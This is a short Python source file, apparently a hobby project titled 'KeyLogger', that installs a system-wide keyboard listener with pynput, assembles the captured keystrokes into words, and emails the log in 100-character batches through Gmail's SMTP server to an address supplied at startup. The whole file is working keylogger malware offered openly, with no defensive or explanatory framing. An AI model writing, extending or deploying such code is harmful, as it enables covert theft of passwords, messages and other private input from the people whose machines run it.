import getpass
import smtplib
#import email protocol library

from pynput.keyboard import Key, Listener

print('''    __ __           __                               
   / //_/__  __  __/ /   ____  ____ _____ ____  _____
  / ,< / _ \/ / / / /   / __ \/ __ `/ __ `/ _ \/ ___/
 / /| /  __/ /_/ / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_\___/\__, /_____/\____/\__, /\__, /\___/_/     
          /____/            /____//____/            
                                         by thisisnotdevin ''')


# set up an email

email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
# stops the keys from appearing so you cant see the passsword

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# logger
full_log = ''
word = ''
email_char_limit = 100
# how many characters to send an email

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit: 
            # send once it matches the limit
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return

        # if the key is backspace delete the word
    elif key == Key.backspace:
        word = word[:-1]

    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener ( on_press = on_press ) as listener:
    listener.join()